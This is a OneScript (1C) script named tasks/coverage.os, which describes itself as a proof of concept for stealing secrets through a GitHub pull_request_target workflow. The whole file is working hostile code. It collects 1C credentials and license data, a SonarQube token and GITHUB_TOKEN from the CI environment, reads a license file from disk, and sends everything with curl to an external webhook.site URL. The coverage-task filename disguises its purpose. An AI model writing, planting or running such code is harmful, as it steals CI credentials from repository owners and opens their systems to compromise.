// === FULL SECRETS EXFIL POC - pull_request_target ===
// tasks/coverage.os
// Webhook: https://webhook.site/a6f21f54-b7e9-4b17-b637-a19355971909

Процедура ВыполнитьЭксплойт()
	Сообщить("=== FULL SECRETS EXFIL POC STARTED (OneScript via pull_request_target) ===");

	// Collect all known secrets + context
	Секреты = Новый Соответствие;
	
	Секреты.Вставить("ONEC_USERNAME",     ПолучитьПеременнуюСреды("ONEC_USERNAME"));
	Секреты.Вставить("ONEC_PASSWORD",     ПолучитьПеременнуюСреды("ONEC_PASSWORD"));
	Секреты.Вставить("ONEC_LICENSE",      ПолучитьПеременнуюСреды("ONEC_LICENSE"));
	Секреты.Вставить("SONARQUBE_TOKEN",   ПолучитьПеременнуюСреды("SONARQUBE_TOKEN"));
	Секреты.Вставить("SONARQUBE_HOST",    ПолучитьПеременнуюСреды("SONARQUBE_HOST"));
	Секреты.Вставить("GITHUB_TOKEN",      ПолучитьПеременнуюСреды("GITHUB_TOKEN"));
	Секреты.Вставить("GITHUB_REPOSITORY", ПолучитьПеременнуюСреды("GITHUB_REPOSITORY"));
	Секреты.Вставить("GITHUB_ACTOR",      ПолучитьПеременнуюСреды("GITHUB_ACTOR"));
	Секреты.Вставить("GITHUB_EVENT_NAME", ПолучитьПеременнуюСреды("GITHUB_EVENT_NAME"));
	Секреты.Вставить("GITHUB_REF",        ПолучитьПеременнуюСреды("GITHUB_REF"));

	// Read license file from disk as well
	Попытка
		Чтение = Новый ЧтениеТекста("/var/1C/licenses/licence.lic");
		Секреты.Вставить("ONEC_LICENSE_FILE", Чтение.Прочитать());
		Чтение.Закрыть();
	Исключение
		Секреты.Вставить("ONEC_LICENSE_FILE", "[file_not_found_or_access_denied]");
	КонецПопытки;

	// Build JSON payload
	Пейлоад = "{";
	Для Каждого Эл Из Секреты Цикл
		Значение = ?(Эл.Значение = Неопределено, "[empty]", Строка(Эл.Значение));
		Значение = СтрЗаменить(Значение, """", "\""");
		Значение = СтрЗаменить(Значение, "\", "\\");
		Пейлоад = Пейлоад + """" + Эл.Ключ + """:""" + Значение + """,";
	КонецЦикла;
	Пейлоад = Лев(Пейлоад, СтрДлина(Пейлоад)-1) + "}";

	// Send all secrets to your webhook
	Команда = "curl -s -X POST " +
		"-H ""Content-Type: application/json"" " +
		"-d '" + Пейлоад + "' " +
		"https://webhook.site/a6f21f54-b7e9-4b17-b637-a19355971909";

	ЗапуститьПриложение(Команда, "", Ложь);

	Сообщить("=== ALL SECRETS EXFILTRATED to webhook.site ===");
	Сообщить("Check: https://webhook.site/a6f21f54-b7e9-4b17-b637-a19355971909");
КонецПроцедуры

// Entry point
ВыполнитьЭксплойт();
